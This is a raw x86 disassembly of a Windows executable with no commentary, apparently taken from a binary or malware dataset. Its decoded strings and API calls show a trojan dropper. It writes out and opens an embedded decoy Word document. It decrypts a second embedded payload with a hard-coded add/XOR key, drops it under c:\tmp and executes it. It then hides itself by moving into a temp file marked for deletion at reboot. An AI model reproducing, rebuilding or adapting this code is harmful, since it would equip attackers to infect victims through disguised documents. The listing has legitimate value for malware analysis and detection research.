sub_401000
push 0xffffffff
push sub_40203b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x620
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov ecx eax
call sub_401070
mov [ rw-data ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401070
mov edx ecx
push esi
push edi
mov ecx 0x41
lea esi [ edx + 0x8 ]
xor eax eax
mov edi esi
mov [ edx + 0x4 ] 0x0
[ edi ]
mov ecx 0x41
lea edi [ esi + 0x104 ]
[ edi ]
mov ecx 0x41
lea edi [ esi + 0x208 ]
[ edi ]
mov ecx 0x41
lea edi [ edx + 0x51c ]
mov [ edx ] r--data
[ edi ]
mov ecx 0x41
lea edi [ edx + 0x314 ]
[ edi ]
mov ecx 0x41
lea edi [ edx + 0x418 ]
[ edi ]
pop edi
mov eax edx
pop esi
retn
sub_401100
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
lea eax [ ecx + 0x314 ]
push esi
mov esi 0x104
sub edx eax
test esi esi
jne r-xdata
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
mov [ eax ] 0x0
pop esi
retn 0x8
mov [ eax - 0x1 ] 0x0
pop esi
retn 0x8
mov cl [ edx + eax ]
test cl cl
je r-xdata
mov [ eax - 0x1 ] 0x0
pop esi
retn 0x8
sub_401180
push ecx
push esi
mov esi ecx
call sub_401b10
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
add esi 0x10c
push 0x40000000
push esi
call [ CreateFileA@IAT ]
mov esi eax
lea eax [ esp + 0x4 ]
push 0x0
push eax
push 0x6200
push rw-data
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
pop ecx
retn
sub_4011d0
sub esp 0xc
mov al 0x5c
push 0x0
mov [ esp + 0x6 ] al
mov [ esp + 0x7 ] al
mov [ esp + 0xb ] al
mov [ esp + 0xc ] al
lea eax [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x63
push eax
mov [ esp + 0x9 ] 0x3a
mov [ esp + 0xc ] 0x74
mov [ esp + 0xd ] 0x6d
mov [ esp + 0xe ] 0x70
mov [ esp + 0x11 ] 0x0
call [ CreateDirectoryA@IAT ]
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp ]
push esi
mov esi 0x104
sub edx eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
test esi esi
jne r-xdata
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
add esp 0xc
retn 0x4
mov [ eax ] 0x0
pop esi
dec eax
mov cl [ edx + eax ]
test cl cl
je r-xdata
dec eax
pop esi
mov [ eax ] 0x0
add esp 0xc
retn 0x4
sub_401260
sub esp 0x704
push ebx
xor eax eax
push ebp
push esi
mov [ esp + 0x7d ] eax
push edi
add ecx 0x10c
xor ebx ebx
mov [ esp + 0x85 ] eax
push 0x2e
push ecx
mov [ esp + 0x88 ] bl
mov [ esp + 0x91 ] al
mov [ esp + 0xa0 ] ecx
call [ strrchr@IAT ]
mov edx eax
lea eax [ esp + 0x88 ]
add esp 0x8
mov esi 0xa
lea ecx [ esp + 0x80 ]
sub edx eax
cmp esi ebx
jne r-xdata
mov [ ecx ] al
inc ecx
dec esi
jne r-xdata
mov [ ecx ] bl
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x611 ]
mov [ esp + 0x610 ] bl
mov dl 0x45
[ edi ]
stosw [ edi ]
mov cl 0x5f
mov [ esp + 0x2a ] dl
stosb [ edi ]
mov [ esp + 0x2c ] cl
mov [ esp + 0x34 ] cl
mov al 0x53
mov [ esp + 0x32 ] dl
lea ecx [ esp + 0x80 ]
lea edx [ esp + 0x28 ]
mov [ esp + 0x30 ] al
mov [ esp + 0x31 ] al
mov [ esp + 0x33 ] al
push ecx
push edx
lea eax [ esp + 0x618 ]
push 0x104
push eax
mov [ esp + 0x38 ] 0x48
mov [ esp + 0x39 ] 0x4b
mov [ esp + 0x3b ] 0x59
mov [ esp + 0x3d ] 0x43
mov [ esp + 0x3e ] 0x4c
mov [ esp + 0x3f ] 0x41
mov [ esp + 0x45 ] 0x52
mov [ esp + 0x46 ] 0x4f
mov [ esp + 0x47 ] 0x4f
mov [ esp + 0x48 ] 0x54
mov [ esp + 0x49 ] 0x5c
mov [ esp + 0x4a ] 0x25
mov [ esp + 0x4b ] 0x73
mov [ esp + 0x4c ] bl
call sub_401cd0
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x315 ]
mov [ esp + 0x314 ] bl
[ edi ]
mov esi [ RegOpenKeyExA@IAT ]
add esp 0x10
lea ecx [ esp + 0x94 ]
lea edx [ esp + 0x80 ]
push ecx
push 0xf003f
stosw [ edi ]
push ebx
push edx
push 0x80000000
stosb [ edi ]
call esi
test eax eax
je r-xdata
dec ecx
mov al [ edx + ecx ]
cmp al bl
je r-xdata
jmp r-xdata
mov edx [ esp + 0x94 ]
lea eax [ esp + 0xa0 ]
lea ecx [ esp + 0x304 ]
push eax
push ecx
push ebx
push ebx
push ebx
push edx
mov [ esp + 0xb8 ] 0x104
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x704
retn
mov eax [ esp + 0x94 ]
mov ebp [ RegCloseKey@IAT ]
push eax
call ebp
mov ecx 0x40
xor eax eax
lea edi [ esp + 0xfd ]
mov [ esp + 0xfc ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x50d ]
mov [ esp + 0x50c ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x304 ]
lea edx [ esp + 0x40 ]
stosb [ edi ]
push ecx
push edx
lea eax [ esp + 0x514 ]
push 0x104
push eax
mov [ esp + 0x50 ] 0x25
mov [ esp + 0x51 ] 0x73
mov [ esp + 0x52 ] 0x5c
mov [ esp + 0x53 ] 0x73
mov [ esp + 0x54 ] 0x68
mov [ esp + 0x55 ] 0x65
mov [ esp + 0x56 ] 0x6c
mov [ esp + 0x57 ] 0x6c
mov [ esp + 0x58 ] 0x5c
mov [ esp + 0x59 ] 0x4f
mov [ esp + 0x5a ] 0x70
mov [ esp + 0x5b ] 0x65
mov [ esp + 0x5c ] 0x6e
mov [ esp + 0x5d ] 0x5c
mov [ esp + 0x5e ] 0x63
mov [ esp + 0x5f ] 0x6f
mov [ esp + 0x60 ] 0x6d
mov [ esp + 0x61 ] 0x6d
mov [ esp + 0x62 ] 0x61
mov [ esp + 0x63 ] 0x6e
mov [ esp + 0x64 ] 0x64
mov [ esp + 0x65 ] bl
call sub_401cd0
add esp 0x10
lea ecx [ esp + 0x8c ]
lea edx [ esp + 0x50c ]
push ecx
push 0xf003f
push ebx
push edx
push 0x80000000
call esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x704
retn
mov edx [ esp + 0x8c ]
mov edi [ RegQueryValueExA@IAT ]
lea eax [ esp + 0xa4 ]
lea ecx [ esp + 0xfc ]
push eax
push ecx
push ebx
push ebx
push ebx
push edx
mov [ esp + 0xbc ] 0x104
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x704
retn
mov edx [ esp + 0x8c ]
push edx
call ebp
mov ecx 0x10
xor eax eax
lea edi [ esp + 0xbc ]
mov [ esp + 0x200 ] bl
[ edi ]
mov [ esp + 0xac ] eax
mov ecx 0x40
mov [ esp + 0xb0 ] eax
lea edi [ esp + 0x201 ]
mov [ esp + 0xb4 ] eax
lea edx [ esp + 0xfc ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0xb8 ] 0x44
push ecx
push edx
mov [ esp + 0xb0 ] ebx
mov [ esp + 0x18 ] 0x22
stosb [ edi ]
mov [ esp + 0x19 ] 0x25
mov [ esp + 0x1a ] 0x31
mov [ esp + 0x1b ] 0x22
mov [ esp + 0x1c ] bl
call [ strstr@IAT ]
add esp 0x8
cmp eax ebx
je r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x80 ]
push eax
push ecx
mov [ esp + 0x20 ] 0x2e
mov [ esp + 0x21 ] 0x64
mov [ esp + 0x22 ] 0x6f
mov [ esp + 0x23 ] 0x63
mov [ esp + 0x24 ] bl
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x98 ]
lea ecx [ esp + 0xfc ]
push eax
lea edx [ esp + 0x24 ]
push ecx
push edx
lea eax [ esp + 0x20c ]
push 0x104
push eax
mov [ esp + 0x34 ] 0x25
mov [ esp + 0x35 ] 0x73
mov [ esp + 0x36 ] 0x20
mov [ esp + 0x37 ] 0x22
mov [ esp + 0x38 ] 0x25
mov [ esp + 0x39 ] 0x73
mov [ esp + 0x3a ] 0x22
mov [ esp + 0x3b ] bl
call sub_401cd0
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x41d ]
mov [ esp + 0x41c ] bl
[ edi ]
add esp 0x14
lea ecx [ esp + 0x408 ]
stosw [ edi ]
push 0x104
lea edx [ esp + 0x204 ]
push ecx
push edx
stosb [ edi ]
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ esp + 0xa8 ]
lea ecx [ esp + 0xb8 ]
push eax
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
lea edx [ esp + 0x424 ]
push ebx
push edx
push ebx
call [ CreateProcessA@IAT ]
pop edi
pop esi
test eax eax
pop ebp
pop ebx
setne al
add esp 0x704
retn
mov [ eax ] bl
lea edx [ esp + 0x90 ]
lea eax [ esp + 0x58 ]
push edx
push 0xf003f
push ebx
push eax
push 0x80000000
mov [ esp + 0x6c ] 0x57
mov [ esp + 0x6d ] 0x6f
mov [ esp + 0x6e ] 0x72
mov [ esp + 0x6f ] 0x64
mov [ esp + 0x70 ] 0x70
mov [ esp + 0x71 ] 0x61
mov [ esp + 0x72 ] 0x64
mov [ esp + 0x73 ] 0x2e
mov [ esp + 0x74 ] 0x44
mov [ esp + 0x75 ] 0x6f
mov [ esp + 0x76 ] 0x63
mov [ esp + 0x77 ] 0x75
mov [ esp + 0x78 ] 0x6d
mov [ esp + 0x79 ] 0x65
mov [ esp + 0x7a ] 0x6e
mov [ esp + 0x7b ] 0x74
mov [ esp + 0x7c ] 0x2e
mov [ esp + 0x7d ] 0x31
mov [ esp + 0x7e ] 0x5c
mov [ esp + 0x7f ] 0x73
mov [ esp + 0x80 ] 0x68
mov [ esp + 0x81 ] 0x65
mov [ esp + 0x82 ] 0x6c
mov [ esp + 0x83 ] 0x6c
mov [ esp + 0x84 ] 0x5c
mov [ esp + 0x85 ] 0x6f
mov [ esp + 0x86 ] 0x70
mov [ esp + 0x87 ] 0x65
mov [ esp + 0x88 ] 0x6e
mov [ esp + 0x89 ] 0x5c
mov [ esp + 0x8a ] 0x63
mov [ esp + 0x8b ] 0x6f
mov [ esp + 0x8c ] 0x6d
mov [ esp + 0x8d ] 0x6d
mov [ esp + 0x8e ] 0x61
mov [ esp + 0x8f ] 0x6e
mov [ esp + 0x90 ] 0x64
mov [ esp + 0x91 ] bl
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x90 ]
lea ecx [ esp + 0x9c ]
lea edx [ esp + 0xfc ]
push ecx
push edx
push ebx
push ebx
push ebx
push eax
mov [ esp + 0xb4 ] 0x104
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x704
retn
mov ecx [ esp + 0x90 ]
push ecx
call ebp
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x704
retn
sub_401820
sub esp 0x8
push 0x5
push 0x0
add ecx 0x10c
push 0x0
lea eax [ esp + 0xc ]
push ecx
push eax
push 0x0
mov [ esp + 0x18 ] 0x6f
mov [ esp + 0x19 ] 0x70
mov [ esp + 0x1a ] 0x65
mov [ esp + 0x1b ] 0x6e
mov [ esp + 0x1c ] 0x0
call [ ShellExecuteA@IAT ]
add esp 0x8
retn
sub_401860
sub esp 0x54
mov edx ecx
push edi
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
[ edi ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0xc ] eax
push ecx
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x18 ]
lea ecx [ edx + 0x418 ]
push eax
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
add edx 0x51c
push 0x0
push edx
mov [ esp + 0x3c ] 0x44
call [ CreateProcessA@IAT ]
pop edi
add esp 0x54
retn
sub_4018c0
sub esp 0x20
push ebp
push esi
push edi
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0xc ] 0x61
mov [ esp + 0xd ] 0x62
mov [ esp + 0xe ] 0x63
mov [ esp + 0xf ] 0x64
mov [ esp + 0x10 ] 0x65
mov [ esp + 0x11 ] 0x66
mov [ esp + 0x12 ] 0x67
mov [ esp + 0x13 ] 0x21
mov [ esp + 0x14 ] 0x40
mov [ esp + 0x15 ] 0x23
mov [ esp + 0x16 ] 0x24
mov [ esp + 0x17 ] 0x25
mov [ esp + 0x18 ] 0x5e
mov [ esp + 0x19 ] 0x26
mov [ esp + 0x1a ] 0x2a
mov [ esp + 0x1b ] 0x28
mov [ esp + 0x1c ] 0x29
mov [ esp + 0x1d ] 0x5f
mov [ esp + 0x1e ] 0x2b
mov [ esp + 0x1f ] 0x7b
mov [ esp + 0x20 ] 0x7d
mov [ esp + 0x21 ] 0x3c
mov [ esp + 0x22 ] 0x3e
mov [ esp + 0x23 ] 0x3f
mov [ esp + 0x24 ] 0x2f
mov [ esp + 0x25 ] 0x2e
mov [ esp + 0x26 ] 0x27
mov [ esp + 0x27 ] 0x3b
mov [ esp + 0x28 ] 0x5d
mov [ esp + 0x29 ] 0x5b
mov [ esp + 0x2a ] 0x0
xor esi esi
[ edi ]
not ecx
dec ecx
xor edi edi
mov ebp ecx
mov ecx [ esp + 0x38 ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x34 ]
pop edi
pop esi
pop ebp
add esp 0x20
retn 0xc
push ebx
mov ebx [ esp + 0x38 ]
mov eax edi
xor edx edx
div ebp
mov al [ esp + edx + 0x10 ]
mov dl [ esi + ebx ]
add al dl
mov dl [ esp + 0x34 ]
xor al dl
mov [ esi + ebx ] al
inc esi
inc edi
cmp esi ecx
jb r-xdata
xor edi edi
test esi 0x3ff
jne r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
add esp 0x20
retn 0xc
sub_4019d0
push ecx
push esi
push edi
mov esi ecx
call sub_401c70
mov eax [ esp + 0x10 ]
push 0x14ec8
push rw-data
push eax
mov ecx esi
call sub_4018c0
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
add esi 0x51c
push 0x40000000
push esi
mov edi eax
call [ CreateFileA@IAT ]
lea ecx [ esp + 0x8 ]
push 0x0
push ecx
mov esi eax
push 0x14ec8
push edi
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ecx
retn 0x4
sub_401a40
sub esp 0x214
push esi
mov esi ecx
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x118 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x119 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x118 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov al 0x30
lea ecx [ esp + 0x14 ]
mov [ esp + 0x9 ] al
mov [ esp + 0xa ] al
push ecx
lea edx [ esp + 0xc ]
push 0x0
lea eax [ esp + 0x120 ]
push edx
push eax
mov [ esp + 0x18 ] 0x7e
mov [ esp + 0x1b ] 0x37
mov [ esp + 0x1c ] 0x39
mov [ esp + 0x1d ] 0x38
mov [ esp + 0x1e ] 0x31
mov [ esp + 0x1f ] 0x47
mov [ esp + 0x20 ] 0x0
call [ GetTempFileNameA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
call [ DeleteFileA@IAT ]
lea edx [ esp + 0x14 ]
add esi 0x210
push edx
push esi
call [ MoveFileA@IAT ]
push 0x4
lea eax [ esp + 0x18 ]
push 0x0
push eax
call [ MoveFileExA@IAT ]
pop edi
pop esi
add esp 0x214
retn
sub_401b10
sub esp 0x210
push ebx
push ebp
push esi
mov ebp ecx
push edi
xor ebx ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x19 ]
mov [ esp + 0x18 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x18 ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp + 0x8 ]
lea edx [ esp + 0x18 ]
mov esi 0x104
sub edx eax
cmp esi ebx
jne r-xdata
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
mov [ eax ] bl
lea eax [ ebp + 0x210 ]
lea edx [ esp + 0x18 ]
mov esi 0x104
sub edx eax
dec eax
mov cl [ edx + eax ]
cmp cl bl
je r-xdata
jmp r-xdata
cmp esi ebx
jne r-xdata
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
mov [ eax ] bl
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov al 0x5c
mov edx ecx
mov cl [ esp + edx + 0x16 ]
sub edx 0x2
cmp cl al
je r-xdata
dec eax
mov cl [ edx + eax ]
cmp cl bl
je r-xdata
jmp r-xdata
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x11d ]
mov [ esp + 0x11c ] bl
[ edi ]
stosw [ edi ]
lea esi [ esp + edx + 0x19 ]
lea ecx [ esp + 0x11c ]
stosb [ edi ]
mov edx esi
mov edi 0x104
lea eax [ esp + 0x11c ]
sub edx ecx
mov cl [ esp + edx + 0x17 ]
dec edx
cmp cl al
jne r-xdata
cmp edi ebx
jne r-xdata
mov [ eax ] cl
inc eax
dec edi
jne r-xdata
lea edx [ esp + 0x11c ]
push rw-data
push edx
mov [ eax ] bl
call [ strstr@IAT ]
mov [ eax + 0x4 ] bl
mov al 0x73
mov cl 0x25
add esp 0x8
mov [ esp + 0x11 ] al
mov [ esp + 0x13 ] al
mov [ esp + 0x10 ] cl
mov [ esp + 0x12 ] cl
lea eax [ esp + 0x11c ]
lea ecx [ esp + 0x18 ]
push eax
lea edx [ esp + 0x14 ]
push ecx
push edx
add ebp 0x10c
push 0x104
push ebp
mov [ esi ] bl
mov [ esp + 0x28 ] bl
call sub_401cd0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
dec eax
mov cl [ edx + eax ]
cmp cl bl
je r-xdata
jmp r-xdata
sub_401c70
sub esp 0x8
push esi
mov esi ecx
push edi
lea edi [ esi + 0x418 ]
push edi
call sub_4011d0
mov al 0x73
mov cl 0x25
mov [ esp + 0x9 ] al
mov [ esp + 0xb ] al
lea eax [ esi + 0x314 ]
mov [ esp + 0x8 ] cl
mov [ esp + 0xa ] cl
push eax
lea ecx [ esp + 0xc ]
push edi
push ecx
add esi 0x51c
push 0x104
push esi
mov [ esp + 0x20 ] 0x0
call sub_401cd0
add esp 0x14
pop edi
pop esi
add esp 0x8
retn
sub_401cd0
mov eax [ esp + 0x8 ]
cmp eax 0x7fffffff
jbe r-xdata
push ebx
xor ebx ebx
push esi
push edi
test eax eax
jne r-xdata
mov eax 0x80070057
retn
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x10 ]
lea esi [ eax - 0x1 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
push esi
push edi
call [ _vsnprintf@IAT ]
add esp 0x10
test eax eax
jl r-xdata
mov ebx 0x80070057
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov [ esi + edi ] 0x0
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov [ esi + edi ] 0x0
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_401d40
sub esp 0x34
push esi
call [ GetInputState@IAT ]
push 0x0
push 0x0
push 0x0
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
push 0x0
push 0x0
lea eax [ esp + 0x24 ]
push 0x0
push eax
call [ GetMessageA@IAT ]
mov cl 0x61
mov al 0x65
mov [ esp + 0xc ] 0x44
mov [ esp + 0xd ] cl
mov [ esp + 0xe ] 0x75
mov [ esp + 0xf ] 0x6d
mov [ esp + 0x10 ] 0x43
mov [ esp + 0x11 ] 0x6c
mov [ esp + 0x12 ] al
mov [ esp + 0x13 ] cl
mov [ esp + 0x14 ] 0x6e
mov [ esp + 0x15 ] 0x73
mov [ esp + 0x16 ] 0x2e
mov [ esp + 0x17 ] al
mov [ esp + 0x18 ] 0x78
mov [ esp + 0x19 ] al
mov [ esp + 0x1a ] 0x0
call sub_401000
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0xc ]
push ecx
push edx
mov ecx eax
mov [ rw-data ] eax
call sub_401100
mov esi [ _beginthread@IAT ]
push 0x0
push 0x0
push sub_401e30
mov [ esp + 0x10 ] 0x0
call esi
push 0x0
push 0x0
push sub_401e60
mov [ esp + 0x1c ] eax
call esi
add esp 0x18
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push 0xffffffff
push 0x1
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
mov esi [ CloseHandle@IAT ]
mov ecx [ esp + 0x4 ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
xor eax eax
pop esi
add esp 0x34
retn 0x10
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40201f
cmp [ rw-data ] ebx
jne r-xdata
call sub_40200a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40201c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401d40
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4010e0
push esi
mov esi ecx
call sub_401150
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401150
mov [ ecx ] r--data
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_401e30
mov ecx [ rw-data ]
call sub_401180
mov ecx [ rw-data ]
call sub_401260
test al al
jne r-xdata
mov ecx [ rw-data ]
jmp sub_401a40
mov ecx [ rw-data ]
call sub_401820
sub_401e60
mov ecx [ rw-data ]
push 0x11
call sub_4019d0
mov ecx [ rw-data ]
jmp sub_401860
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40200a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40201c
xor eax eax
retn
sub_40201f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402030
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_40203b
mov eax r--data
jmp __CxxFrameHandler
